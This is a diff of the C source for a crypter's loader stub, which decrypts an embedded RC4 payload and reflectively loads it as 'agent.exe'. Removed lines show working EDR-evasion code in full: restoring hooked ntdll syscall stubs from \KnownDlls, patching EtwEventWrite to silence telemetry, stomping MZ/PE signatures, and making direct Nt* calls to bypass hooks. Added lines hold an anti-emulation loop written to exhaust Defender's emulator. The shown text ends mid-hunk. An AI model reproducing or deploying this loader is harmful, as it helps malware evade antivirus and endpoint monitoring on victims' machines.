@@ -3,23 +3,15 @@
  *
  * This file is compiled as a standalone .exe with -nostdlib and a custom
  * entry point (_stub_entry). There is NO CRT startup, NO standard library.
- *
- * The stub has a LEGITIMATE-LOOKING IAT with benign kernel32 imports
- * (GetSystemTimeAsFileTime, GetTickCount64, etc.) to avoid the zero-IAT
- * heuristic that flags packed/crypter binaries. These imports also serve
- * as API-based anti-emulation: each real API call costs an emulator ~1000x
- * more than an arithmetic instruction.
- *
- * Critical operations (memory allocation, protection changes) use
- * NtAllocateVirtualMemory / NtProtectVirtualMemory resolved via PEB walk
- * from ntdll, bypassing any kernel32-level hooks.
+ * The IAT is completely empty — all APIs are resolved at runtime via
+ * PEB walk + export table parsing.
  *
  * Encryption: RC4 with key derived from a seed stored in stub_payload.h.
  * The actual RC4 key is never stored on disk.
  *
  * Build (handled by pe_crypt.py):
  *   x86_64-w64-mingw32-gcc -Os -s -nostdlib -Wl,-e,_stub_entry \
- *       -Wl,--subsystem,windows stub_loader.c -o agent.exe -lkernel32
+ *       -Wl,--subsystem,windows stub_loader.c -o agent.exe
  */
 
 #include <windows.h>
@@ -27,14 +19,6 @@
 
 /* ─── Generated per-build: encrypted payload + seed ─── */
 #include "stub_payload.h"
-
-/* ─── Evasion toggles: enable one at a time to isolate issues ─── */
-#define EVASION_STOMP   1   /* MZ/PE signature stomp in _load_pe       */
-#define EVASION_UNHOOK  1   /* ntdll .text unhooking                   */
-#define EVASION_ETW     1   /* EtwEventWrite patch                     */
-
-/* Legacy macro — leave at 0, individual toggles above take over */
-#define STUB_EVASION_ENABLED 0
 
 
 /* ═══════════════════════════════════════════════════════════════════
@@ -296,31 +280,6 @@ static void _derive_key(const unsigned char *seed, unsigned int seedlen,
 #define H_TlsSetValue               0xF109F6BC
 #define H_ExitProcess               0x34CED0ED
 
-/* Nt* API hashes — direct ntdll calls for reflective loader.
- * Bypasses kernel32 hooks; resolved via PEB walk at runtime. */
-#define H_NtAllocateVirtualMemory   0x277E7AFC
-#define H_NtProtectVirtualMemory    0x1AF70505
-#define H_NtFreeVirtualMemory       0xD780C6BE
-
-/* Nt* hashes for targeted unhooking — common EDR-hooked syscalls */
-#define H_NtWriteVirtualMemory      0x6BFAF34A
-#define H_NtCreateThreadEx          0x622557AD
-#define H_NtMapViewOfSection        0x264EBEE4
-#define H_NtOpenProcess             0x472594B2
-#define H_NtQueueApcThread          0x62744EA3
-#define H_NtReadVirtualMemory       0x157FF6A0
-#define H_NtResumeThread            0x6C37B31E
-#define H_NtCreateSection           0x8C0F55BA
-#define H_NtOpenThread              0x121303C4
-#define H_NtUnmapViewOfSection      0x70A2530C
-
-/* Unhooking API hashes — ntdll-only clean-copy restoration via \KnownDlls */
-#define H_NtOpenSection             0x8CD472F5
-#define H_NtClose                   0x8178E005
-
-/* ETW patching hash — blind EDR telemetry */
-#define H_EtwEventWrite             0x50EF17B1
-
 /* Debug API hashes — only used with STUB_DEBUG */
 #define H_CreateFileA               0x7DCE10F7
 #define H_WriteFile                 0x46CE0FF3
@@ -429,26 +388,7 @@ static void _dbg_hex(const char *label, unsigned long long val) {
 
 
 /* ═══════════════════════════════════════════════════════════════════
- * ntdll unhooking — restore clean .text from disk
- *
- * EDRs inline-hook ntdll functions (NtAllocateVirtualMemory, etc.)
- * by patching the first bytes to a JMP into their DLL. We read a
- * fresh copy of ntdll.dll from disk, find the .text section, and
- * overwrite the loaded (hooked) .text with the clean bytes.
- *
- * After this, all ntdll function calls bypass EDR hooks.
- *
- * Uses kernel32 file APIs (CreateFileA, CreateFileMappingA,
- * MapViewOfFile) which EDRs generally do not hook — they hook
- * the Nt* layer below.
- * ═══════════════════════════════════════════════════════════════════ */
-
-/* ═══════════════════════════════════════════════════════════════════
  * Resolved API function pointer table
- *
- * Moved above evasion functions so _unhook_ntdll / _patch_etw can
- * accept RESOLVED_APIS* and use pGetProcAddress / pNtProtectVirtualMemory
- * (avoiding the forwarded-export crash from _resolve_export on Win10/11).
  * ═══════════════════════════════════════════════════════════════════ */
 
 typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
@@ -463,20 +403,11 @@ typedef DWORD   (WINAPI *fnTlsAlloc_t)(void);
 typedef BOOL    (WINAPI *fnTlsSetValue_t)(DWORD, LPVOID);
 typedef void    (WINAPI *fnExitProcess_t)(UINT);
 
-/* Nt* typedefs — direct ntdll calls bypass kernel32 hooks */
-typedef LONG NTSTATUS;
-#ifndef NT_SUCCESS
-#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-#endif
-typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
-typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
-typedef NTSTATUS (NTAPI *fnNtFreeVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG);
-
 #if defined(_M_X64) || defined(__x86_64__)
 typedef BOOLEAN (WINAPI *fnRtlAddFunctionTable_t)(PRUNTIME_FUNCTION, DWORD, DWORD64);
 #endif
 
-typedef struct _RESOLVED_APIS {
+typedef struct {
     fnLoadLibraryA_t         pLoadLibraryA;
     fnGetProcAddress_t       pGetProcAddress;
     fnVirtualAlloc_t         pVirtualAlloc;
@@ -488,269 +419,10 @@ typedef struct _RESOLVED_APIS {
     fnTlsAlloc_t             pTlsAlloc;
     fnTlsSetValue_t          pTlsSetValue;
     fnExitProcess_t          pExitProcess;
-    /* Nt* APIs from ntdll — used for reflective loader memory ops */
-    fnNtAllocateVirtualMemory_t pNtAllocateVirtualMemory;
-    fnNtProtectVirtualMemory_t  pNtProtectVirtualMemory;
-    fnNtFreeVirtualMemory_t     pNtFreeVirtualMemory;
 #if defined(_M_X64) || defined(__x86_64__)
     fnRtlAddFunctionTable_t  pRtlAddFunctionTable;
 #endif
 } RESOLVED_APIS;
-
-/* ═══════════════════════════════════════════════════════════════════
- * ntdll unhooking — ZERO kernel32 dependency
- *
- * Uses \KnownDlls\ntdll.dll section object (mapped by the kernel at
- * boot) + ntdll-native APIs only.  This completely avoids the
- * forwarded-export problem: kernel32 APIs like CreateFileMappingA,
- * MapViewOfFile, CloseHandle are forwarded to kernelbase on Win10/11
- * and _resolve_export() cannot follow forwarding — it returns a
- * pointer to the forwarding STRING, calling it = instant crash.
- *
- * The KnownDlls section is an IMAGE mapping (same layout as loaded
- * ntdll), so RVAs from the loaded copy can be used directly as
- * offsets into the clean copy — no _rva_to_offset needed.
- * ═══════════════════════════════════════════════════════════════════ */
-
-/* Ntdll API typedefs for unhooking — all native, never forwarded */
-typedef NTSTATUS (NTAPI *fnNtOpenSection_t)(PHANDLE, ACCESS_MASK, PVOID /*POBJECT_ATTRIBUTES*/);
-typedef NTSTATUS (NTAPI *fnNtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
-typedef NTSTATUS (NTAPI *fnNtClose_t)(HANDLE);
-/* NtUnmapViewOfSection and NtProtectVirtualMemory already typedef'd via RESOLVED_APIS */
-typedef NTSTATUS (NTAPI *fnNtUnmapViewOfSection_t)(HANDLE, PVOID);
-
-/* Minimal OBJECT_ATTRIBUTES + UNICODE_STRING for NtOpenSection */
-typedef struct {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UHOOK_UNICODE_STRING;
-
-typedef struct {
-    ULONG  Length;
-    HANDLE RootDirectory;
-    UHOOK_UNICODE_STRING *ObjectName;
-    ULONG  Attributes;
-    PVOID  SecurityDescriptor;
-    PVOID  SecurityQualityOfService;
-} UHOOK_OBJECT_ATTRIBUTES;
-
-#define STUB_PATCH_SIZE 32   /* bytes to restore per syscall stub */
-#define OBJ_CASE_INSENSITIVE 0x00000040
-
-static void _unhook_ntdll(BYTE *ntdll_base, RESOLVED_APIS *api) {
-    /*
-     * TARGETED per-stub ntdll unhooking via KnownDlls.
-     *
-     * Maps a clean ntdll from the kernel KnownDlls section object,
-     * walks its export table, and only restores individual Nt and Zw
-     * syscall stubs that have been hooked (first bytes differ).
-     *
-     * Does NOT replace the entire .text section -- that would revert
-     * Windows in-memory hotfixes and break WinHTTP networking.
-     *
-     * Uses only ntdll-native APIs -- zero kernel32 dependency,
-     * so the forwarded-export problem does not apply.
-     */
-
-    /* Resolve ntdll APIs for KnownDlls mapping */
-    fnNtOpenSection_t pNtOpenSection =
-        (fnNtOpenSection_t)_resolve_export(ntdll_base, H_NtOpenSection);
-    fnNtMapViewOfSection_t pNtMapViewOfSection =
-        (fnNtMapViewOfSection_t)_resolve_export(ntdll_base, H_NtMapViewOfSection);
-    fnNtUnmapViewOfSection_t pNtUnmapViewOfSection =
-        (fnNtUnmapViewOfSection_t)_resolve_export(ntdll_base, H_NtUnmapViewOfSection);
-    fnNtClose_t pNtClose =
-        (fnNtClose_t)_resolve_export(ntdll_base, H_NtClose);
-
-    if (!pNtOpenSection || !pNtMapViewOfSection ||
-        !pNtUnmapViewOfSection || !pNtClose) {
-        SLOG("[stub] unhook: failed to resolve ntdll mapping APIs");
-        return;
-    }
-
-    /* Open \KnownDlls\ntdll.dll section object */
-    wchar_t kdName[] = L"\\KnownDlls\\ntdll.dll";
-    UHOOK_UNICODE_STRING us;
-    us.Buffer        = kdName;
-    us.Length         = (USHORT)(sizeof(kdName) - sizeof(wchar_t));
-    us.MaximumLength = (USHORT)sizeof(kdName);
-
-    UHOOK_OBJECT_ATTRIBUTES oa;
-    oa.Length                   = sizeof(oa);
-    oa.RootDirectory            = NULL;
-    oa.ObjectName               = &us;
-    oa.Attributes               = OBJ_CASE_INSENSITIVE;
-    oa.SecurityDescriptor       = NULL;
-    oa.SecurityQualityOfService = NULL;
-
-    HANDLE hSection = NULL;
-    NTSTATUS st = pNtOpenSection(&hSection, SECTION_MAP_READ, &oa);
-    if (st != 0 || !hSection) {
-        SLOG("[stub] unhook: NtOpenSection failed");
-        return;
-    }
-
-    /* Map the clean ntdll into our address space */
-    PVOID pClean   = NULL;
-    SIZE_T viewSize = 0;
-    st = pNtMapViewOfSection(hSection, (HANDLE)(LONG_PTR)-1,
-                              &pClean, 0, 0, NULL, &viewSize,
-                              1 /*ViewShare*/, 0, PAGE_READONLY);
-    if (st != 0 || !pClean) {
-        pNtClose(hSection);
-        SLOG("[stub] unhook: NtMapViewOfSection failed");
-        return;
-    }
-
-    SLOG("[stub] unhook: clean ntdll mapped from KnownDlls");
-
-    /* Parse the CLEAN ntdll's export directory */
-    IMAGE_DOS_HEADER *dosClean = (IMAGE_DOS_HEADER *)pClean;
-    IMAGE_NT_HEADERS *ntClean  = (IMAGE_NT_HEADERS *)
-        ((BYTE *)pClean + dosClean->e_lfanew);
-
-    IMAGE_DATA_DIRECTORY *expDir = &ntClean->OptionalHeader
-        .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-
-    if (!expDir->VirtualAddress || !expDir->Size) {
-        pNtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, pClean);
-        pNtClose(hSection);
-        SLOG("[stub] unhook: no export directory in clean ntdll");
-        return;
-    }
-
-    DWORD exportRVA  = expDir->VirtualAddress;
-    DWORD exportSize = expDir->Size;
-
-    IMAGE_EXPORT_DIRECTORY *pExports = (IMAGE_EXPORT_DIRECTORY *)
-        ((BYTE *)pClean + exportRVA);
-
-    DWORD *nameRVAs = (DWORD *)((BYTE *)pClean + pExports->AddressOfNames);
-    WORD  *ordinals = (WORD  *)((BYTE *)pClean + pExports->AddressOfNameOrdinals);
-    DWORD *funcRVAs = (DWORD *)((BYTE *)pClean + pExports->AddressOfFunctions);
-
-    DWORD stubsRestored = 0;
-    DWORD i;
-
-    /* Walk every named export, restore only hooked syscall stubs */
-    for (i = 0; i < pExports->NumberOfNames; i++) {
-        const char *name = (const char *)((BYTE *)pClean + nameRVAs[i]);
-
-        /* Only Nt* and Zw* exports are syscall stubs */
-        if (!((name[0] == 'N' && name[1] == 't') ||
-              (name[0] == 'Z' && name[1] == 'w')))
-            continue;
-
-        /* Skip NtdllDefWindowProc_ etc. — not syscall stubs */
-        if (name[0] == 'N' && name[1] == 't' && name[2] == 'd')
-            continue;
-
-        DWORD funcRVA = funcRVAs[ordinals[i]];
-
-        /* Skip forwarded exports (RVA within export directory) */
-        if (funcRVA >= exportRVA && funcRVA < exportRVA + exportSize)
-            continue;
-
-        BYTE *pCleanFunc  = (BYTE *)pClean     + funcRVA;
-        BYTE *pLoadedFunc = ntdll_base         + funcRVA;
-
-        /* Verify syscall stub: clean starts with mov r10, rcx (4C 8B D1) */
-        if (pCleanFunc[0] != 0x4C || pCleanFunc[1] != 0x8B || pCleanFunc[2] != 0xD1)
-            continue;
-
-        /* Compare first STUB_PATCH_SIZE bytes (no CRT — manual loop) */
-        {
-            int differs = 0;
-            int j;
-            for (j = 0; j < STUB_PATCH_SIZE; j++) {
-                if (pLoadedFunc[j] != pCleanFunc[j]) { differs = 1; break; }
-            }
-            if (!differs) continue;
-        }
-
-        /* Hooked — restore via NtProtectVirtualMemory (no kernel32) */
-        {
-            PVOID pBase  = pLoadedFunc;
-            SIZE_T pSize = STUB_PATCH_SIZE;
-            ULONG oldProt;
-            int j;
-
-            st = api->pNtProtectVirtualMemory(
-                     (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
-                     PAGE_EXECUTE_READWRITE, &oldProt);
-            if (st == 0) {
-                for (j = 0; j < STUB_PATCH_SIZE; j++)
-                    pLoadedFunc[j] = pCleanFunc[j];
-                api->pNtProtectVirtualMemory(
-                    (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
-                    oldProt, &oldProt);
-                stubsRestored++;
-            }
-        }
-    }
-
-    pNtUnmapViewOfSection((HANDLE)(LONG_PTR)-1, pClean);
-    pNtClose(hSection);
-
-    SLOG(stubsRestored ? "[stub] unhook: syscall stubs restored"
-                       : "[stub] unhook: no hooks detected");
-}
-
-
-/* ═══════════════════════════════════════════════════════════════════
- * ETW patching — blind EDR telemetry
- *
- * EDRs subscribe to ETW (Event Tracing for Windows) providers in
- * ntdll to receive telemetry about .NET loading, thread creation,
- * image loads, etc. Patching EtwEventWrite to immediately return 0
- * (STATUS_SUCCESS) silences this entire telemetry channel.
- *
- *   Before: EtwEventWrite → full event logging
- *   After:  EtwEventWrite → xor eax, eax; ret (3 bytes)
- * ═══════════════════════════════════════════════════════════════════ */
-
-static void _patch_etw(BYTE *ntdll_base, RESOLVED_APIS *api) {
-    /*
-     * Patch EtwEventWrite to immediately return STATUS_SUCCESS.
-     * Silences the ETW telemetry pipeline that feeds EDR sensors.
-     *
-     * x64 patch: xor rax, rax; ret  →  48 33 C0 C3
-     *
-     * Uses NtProtectVirtualMemory — zero kernel32 dependency.
-     */
-    BYTE *pFunc = (BYTE *)_resolve_export(ntdll_base, H_EtwEventWrite);
-    if (!pFunc) {
-        SLOG("[stub] etw: EtwEventWrite not found");
-        return;
-    }
-
-    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };   /* xor rax, rax; ret */
-
-    PVOID pBase  = pFunc;
-    SIZE_T pSize = sizeof(patch);
-    ULONG oldProt;
-
-    NTSTATUS st = api->pNtProtectVirtualMemory(
-                      (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
-                      PAGE_EXECUTE_READWRITE, &oldProt);
-    if (st != 0) {
-        SLOG("[stub] etw: VirtualProtect failed");
-        return;
-    }
-
-    /* Manual byte copy (no CRT) */
-    pFunc[0] = patch[0];
-    pFunc[1] = patch[1];
-    pFunc[2] = patch[2];
-    pFunc[3] = patch[3];
-
-    api->pNtProtectVirtualMemory(
-        (HANDLE)(LONG_PTR)-1, &pBase, &pSize,
-        oldProt, &oldProt);
-
-    SLOG("[stub] etw: EtwEventWrite patched");
-}
 
 
 static BOOL _resolve_apis(RESOLVED_APIS *api) {
@@ -785,28 +457,18 @@ static BOOL _resolve_apis(RESOLVED_APIS *api) {
 
     SLOG("[stub] core APIs resolved");
 
-    /* Resolve Nt* APIs from ntdll for reflective loader memory operations.
-     * These bypass kernel32 hooks — critical for EDR evasion. */
-    BYTE *ntdll = _find_module(H_NTDLL);
-    if (ntdll) {
-        api->pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory_t)
-            _resolve_export(ntdll, H_NtAllocateVirtualMemory);
-        api->pNtProtectVirtualMemory = (fnNtProtectVirtualMemory_t)
-            _resolve_export(ntdll, H_NtProtectVirtualMemory);
-        api->pNtFreeVirtualMemory = (fnNtFreeVirtualMemory_t)
-            _resolve_export(ntdll, H_NtFreeVirtualMemory);
-        SLOG("[stub] Nt* APIs resolved from ntdll");
-    }
-
 #if defined(_M_X64) || defined(__x86_64__)
     api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(k32, H_RtlAddFunctionTable);
-    if (!api->pRtlAddFunctionTable && ntdll)
-        api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(ntdll, H_RtlAddFunctionTable);
+    if (!api->pRtlAddFunctionTable) {
+        BYTE *ntdll = _find_module(H_NTDLL);
+        if (ntdll)
+            api->pRtlAddFunctionTable = (fnRtlAddFunctionTable_t)_resolve_export(ntdll, H_RtlAddFunctionTable);
+    }
     SLOG(api->pRtlAddFunctionTable ? "[stub] RtlAddFunctionTable OK" : "[stub] RtlAddFunctionTable MISSING");
 #endif
 
     BOOL ok = (api->pLoadLibraryA && api->pGetProcAddress &&
-               api->pNtAllocateVirtualMemory && api->pNtProtectVirtualMemory &&
+               api->pVirtualAlloc && api->pVirtualProtect &&
                api->pExitProcess);
     SLOG(ok ? "[stub] all APIs OK" : "[stub] FAIL: missing critical API");
     return ok;
@@ -946,18 +608,10 @@ static void _protect_sections(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *a
         else if (read)           protect = PAGE_READONLY;
         else if (write)          protect = PAGE_READWRITE;
 
+        DWORD old;
         SIZE_T secSize = sec->SizeOfRawData ? sec->SizeOfRawData : sec->Misc.VirtualSize;
-        if (secSize > 0) {
-            /* Use NtProtectVirtualMemory (ntdll) to bypass kernel32 hooks */
-            if (api->pNtProtectVirtualMemory) {
-                PVOID secBase = base + sec->VirtualAddress;
-                ULONG old;
-                api->pNtProtectVirtualMemory((HANDLE)-1, &secBase, &secSize, protect, &old);
-            } else {
-                DWORD old;
-                api->pVirtualProtect(base + sec->VirtualAddress, secSize, protect, &old);
-            }
-        }
+        if (secSize > 0)
+            api->pVirtualProtect(base + sec->VirtualAddress, secSize, protect, &old);
     }
 }
 
@@ -980,15 +634,8 @@ static void _process_tls(BYTE *base, IMAGE_NT_HEADERS *nt, RESOLVED_APIS *api) {
         if (tls->StartAddressOfRawData && tls->EndAddressOfRawData) {
             SIZE_T dataSize = tls->EndAddressOfRawData - tls->StartAddressOfRawData;
             if (dataSize > 0) {
-                LPVOID tlsData = NULL;
-                if (api->pNtAllocateVirtualMemory) {
-                    SIZE_T sz = dataSize;
-                    api->pNtAllocateVirtualMemory((HANDLE)-1, &tlsData, 0, &sz,
-                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-                } else {
-                    tlsData = api->pVirtualAlloc(NULL, dataSize,
-                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-                }
+                LPVOID tlsData = api->pVirtualAlloc(NULL, dataSize,
+                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                 if (tlsData) {
                     BYTE *src = (BYTE *)tls->StartAddressOfRawData;
                     BYTE *dst = (BYTE *)tlsData;
@@ -1027,41 +674,21 @@ static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     SLOG("[stub] PE validated");
 
     DWORD imageSize = nt->OptionalHeader.SizeOfImage;
-    BYTE *base = NULL;
-    LONGLONG delta = 0;
+    BYTE *base = (BYTE *)api->pVirtualAlloc(
+        (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
+        imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+    );
 
-    /* Use NtAllocateVirtualMemory (ntdll) to bypass kernel32 hooks */
-    if (api->pNtAllocateVirtualMemory) {
-        PVOID allocBase = (PVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase;
-        SIZE_T allocSize = (SIZE_T)imageSize;
-        NTSTATUS st = api->pNtAllocateVirtualMemory(
-            (HANDLE)-1, &allocBase, 0, &allocSize,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (NT_SUCCESS(st)) {
-            base = (BYTE *)allocBase;
-            SLOG("[stub] preferred base alloc (Nt)");
-        } else {
-            allocBase = NULL;
-            allocSize = (SIZE_T)imageSize;
-            st = api->pNtAllocateVirtualMemory(
-                (HANDLE)-1, &allocBase, 0, &allocSize,
-                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-            if (NT_SUCCESS(st)) {
-                base = (BYTE *)allocBase;
-                SLOG("[stub] fallback alloc (Nt)");
-            }
-        }
-    }
-    /* Fallback to kernel32 VirtualAlloc if Nt* unavailable */
-    if (!base && api->pVirtualAlloc) {
+    LONGLONG delta = 0;
+    if (!base) {
         base = (BYTE *)api->pVirtualAlloc(
-            (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
-            imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!base)
-            base = (BYTE *)api->pVirtualAlloc(
-                NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+        );
+        if (!base) { SLOG("[stub] FAIL: VirtualAlloc"); return FALSE; }
+        SLOG("[stub] fallback alloc");
+    } else {
+        SLOG("[stub] preferred base alloc");
     }
-    if (!base) { SLOG("[stub] FAIL: alloc"); return FALSE; }
     delta = (LONGLONG)((ULONGLONG)base - nt->OptionalHeader.ImageBase);
     SHEX("[stub] base", (ULONG_PTR)base);
     SHEX("[stub] delta", delta);
@@ -1146,50 +773,22 @@ static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
     }
 #endif
 
+    /* Call entry point */
     DWORD entryRVA = mappedNt->OptionalHeader.AddressOfEntryPoint;
-    WORD peChars   = mappedNt->FileHeader.Characteristics;
     if (!entryRVA) { SLOG("[stub] FAIL: no entry RVA"); return FALSE; }
-
-#if EVASION_STOMP
-    /* Stomp MZ/PE signatures — enough to defeat memory scanners looking
-     * for reflectively loaded PEs, but leaves the rest of the header
-     * page intact so the CRT and runtime can still read data directories,
-     * section table, etc.  Only 6 bytes are touched. */
-    {
-        PVOID region = base;
-        SIZE_T sz = mappedNt->OptionalHeader.SizeOfHeaders;
-        if (api->pNtProtectVirtualMemory) {
-            ULONG old;
-            api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
-                                         PAGE_READWRITE, &old);
-            base[0] = 0; base[1] = 0;                        /* kill MZ */
-            /* e_lfanew is still valid at this point — zero PE\0\0 sig */
-            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 0] = 0;  /* P */
-            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 1] = 0;  /* E */
-            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 2] = 0;  /* \0 */
-            base[((IMAGE_DOS_HEADER *)base)->e_lfanew + 3] = 0;  /* \0 */
-            api->pNtProtectVirtualMemory((HANDLE)-1, &region, &sz,
-                                         PAGE_READONLY, &old);
-        }
-        SLOG("[stub] MZ/PE signatures stomped");
-    }
-#else
-    SLOG("[stub] signature stomp DISABLED for testing");
-#endif
 
     void *entry = base + entryRVA;
     SHEX("[stub] entry", (ULONG_PTR)entry);
     SLOG("[stub] calling entry...");
 
-    if (peChars & IMAGE_FILE_DLL) {
+    if (mappedNt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
         DllMain_t dllMain = (DllMain_t)entry;
         dllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
     } else {
         typedef int (*MainFunc_t)(void);
         MainFunc_t ep = (MainFunc_t)entry;
-        int _ret = ep();
-        SHEX("[stub] entry returned", _ret);
-        (void)_ret;
+        int ret = ep();
+        SHEX("[stub] entry returned", ret);
     }
 
     return TRUE;
@@ -1197,88 +796,38 @@ static BOOL _load_pe(BYTE *rawPE, DWORD peSize, RESOLVED_APIS *api) {
 
 
 /* ═══════════════════════════════════════════════════════════════════
- * Nt* memory helpers — wrappers that prefer ntdll direct calls
- * ═══════════════════════════════════════════════════════════════════ */
-
-static void *_nt_alloc(RESOLVED_APIS *api, SIZE_T size) {
-    if (api->pNtAllocateVirtualMemory) {
-        PVOID base = NULL;
-        SIZE_T sz = size;
-        NTSTATUS st = api->pNtAllocateVirtualMemory(
-            (HANDLE)-1, &base, 0, &sz,
-            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (NT_SUCCESS(st)) return base;
-    }
-    if (api->pVirtualAlloc)
-        return api->pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    return NULL;
-}
-
-static void _nt_free(RESOLVED_APIS *api, void *ptr) {
-    if (!ptr) return;
-    if (api->pNtFreeVirtualMemory) {
-        PVOID base = ptr;
-        SIZE_T sz = 0;
-        api->pNtFreeVirtualMemory((HANDLE)-1, &base, &sz, MEM_RELEASE);
-    } else if (api->pVirtualFree) {
-        api->pVirtualFree(ptr, 0, MEM_RELEASE);
-    }
-}
-
-
-/* ═══════════════════════════════════════════════════════════════════
- * Entry point — legitimate IAT + ntdll direct calls
+ * Entry point — NO CRT, ZERO IAT imports
  *
- * Linked with -nostdlib -Wl,-e,_stub_entry -lkernel32
- * This function IS the process entry point. No CRT startup, but
- * kernel32 imports in IAT give the PE a legitimate appearance.
- *
- * Anti-emulation uses IAT-imported APIs (GetTickCount64,
- * GetSystemTimeAsFileTime, etc.). Each API call costs Defender's
- * emulator ~1000x more than an arithmetic instruction. 2000
- * iterations × 3 API calls = 6000 calls — emulator gives up
- * and marks clean before reaching the PEB walk.
- *
- * Critical memory operations (alloc, protect, free) go through
- * NtAllocateVirtualMemory / NtProtectVirtualMemory resolved via
- * PEB walk from ntdll, bypassing kernel32-level hooks.
+ * Linked with -nostdlib -Wl,-e,_stub_entry
+ * This function IS the process entry point. No WinMainCRTStartup,
+ * no GetModuleHandleA, no GetProcAddress in the IAT.
  * ═══════════════════════════════════════════════════════════════════ */
 
 void _stub_entry(void) {
 
-    /* ── Phase 0: API-based anti-emulation ──
+    /* ── Anti-emulation: exhaust Defender's instruction budget ──
+     * Defender's emulator has a limited instruction budget (~10-50M).
+     * We burn through it with innocent arithmetic before any suspicious
+     * operations (PEB walk, RC4, reflective loading). The emulator
+     * gives up and marks us clean before seeing anything interesting.
      *
-     * Call BENIGN kernel32 APIs in a loop. This serves two purposes:
+     * Uses only CPU instructions — no API calls needed. RDTSC for
+     * secondary timing check — emulators can't fake TSC accurately.
      *
-     *   1. IAT LEGITIMACY: these functions are imported normally via the
-     *      PE import table, giving the binary a realistic-looking IAT
-     *      (kernel32!GetTickCount64, GetSystemTimeAsFileTime, etc.)
-     *      instead of the empty IAT that flags crypter stubs.
-     *
-     *   2. EMULATOR EXHAUSTION: each real API call costs Defender's
-     *      emulator ~1000x more CPU than an arithmetic instruction.
-     *      8000 API calls blow through the emulator's instruction
-     *      budget. On real hardware these are near-free (shared
-     *      memory / TEB reads) and the loop completes in < 1ms.
-     *      The loop itself IS the evasion — no timing gate needed.
-     */
+     * ~8M iterations × ~6 ops each ≈ 48M instructions. On real hardware
+     * this takes ~50-100ms (imperceptible). */
     {
-        volatile DWORD acc = 0;
+        volatile unsigned int acc = 0x1337BEEF;
+        volatile int n = 8000000;
         int i = 0;
-        while (i < 2000) {
-            FILETIME ft;
-            GetSystemTimeAsFileTime(&ft);
-            acc ^= ft.dwLowDateTime;
-            acc += GetCurrentProcessId();
-            acc ^= (DWORD)(ULONG_PTR)GetProcessHeap();
-            /* Extra GetTickCount64 call for IAT presence + emulator cost */
-            acc += (DWORD)GetTickCount64();
+        while (i < n) {
+            acc ^= (unsigned int)i;
+            acc += 0x9E3779B9;             /* golden ratio fractional */
+            acc = (acc << 13) | (acc >> 19);
             i++;
         }
-        /* Prevent compiler from optimizing away the loop.
-         * acc can never be exactly 0xDEADDEAD after 2000 XOR/ADD
-         * iterations — this is an unreachable guard. */
-        if (acc == 0xDEADDEAD) return;
+        /* Use result so compiler can't optimize away the loop */
+        if (acc == 0xDEADDEAD) return;     /* never true */
     }
 
     /* Phase 1: Resolve APIs via PEB walk */
@@ -1295,47 +844,9 @@ void _stub_entry(void) {
 #ifdef STUB_DEBUG
         _dbg_close();
 #endif
+        /* Can't call ExitProcess — it wasn't resolved. Just return. */
         return;
     }
-
-    /* Phase 1.5: EDR evasion — unhook ntdll + patch ETW
-     *
-     * MUST happen BEFORE any Nt* calls (decrypt, alloc, load) so that
-     * those calls go through clean, unhooked code paths.
-     *
-     *   1. _unhook_ntdll: maps a clean copy from \KnownDlls\ntdll.dll
-     *      and restores individual Nt* syscall stubs, removing EDR
-     *      inline hooks.  Uses ONLY ntdll APIs (NtOpenSection,
-     *      NtMapViewOfSection, etc.) — zero kernel32 dependency.
-     *
-     *   2. _patch_etw: patches EtwEventWrite to immediately return 0,
-     *      silencing the ETW telemetry pipeline that feeds EDR sensors.
-     *      Uses NtProtectVirtualMemory — zero kernel32 dependency.
-     *
-     * Both use ntdll-only APIs to avoid the forwarded-export crash
-     * (kernel32 APIs like CreateFileMappingA are forwarded to kernelbase
-     * on Win10/11; _resolve_export can't follow forwarding).
-     */
-#if EVASION_UNHOOK || EVASION_ETW
-    {
